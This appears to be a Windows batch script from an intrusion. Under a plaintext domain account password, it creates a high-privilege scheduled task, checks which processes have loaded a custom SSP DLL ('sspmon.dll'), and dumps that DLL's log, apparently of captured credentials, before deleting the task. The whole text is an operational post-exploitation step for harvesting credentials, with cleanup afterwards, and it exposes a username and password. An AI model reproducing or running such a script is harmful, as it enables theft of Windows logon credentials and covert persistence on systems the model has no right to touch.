schtasks /create /tn SspTest /tr "cmd.exe /c tasklist /m sspmon.dll > C:\Windows\Temp\tl.txt 2>&1 && whoami >> C:\Windows\Temp\tl.txt" /sc once /st 23:59 /ru HALCYON\jnovoa /rp Madison1 /rl HIGHEST /f > C:\Windows\Temp\trigger_ssp.log 2>&1
schtasks /run /tn SspTest >> C:\Windows\Temp\trigger_ssp.log 2>&1
ping -n 8 127.0.0.1 >nul
echo === SSP LOG === >> C:\Windows\Temp\trigger_ssp.log
type C:\Windows\Temp\ssp.log >> C:\Windows\Temp\trigger_ssp.log 2>&1
schtasks /delete /tn SspTest /f >> C:\Windows\Temp\trigger_ssp.log 2>&1
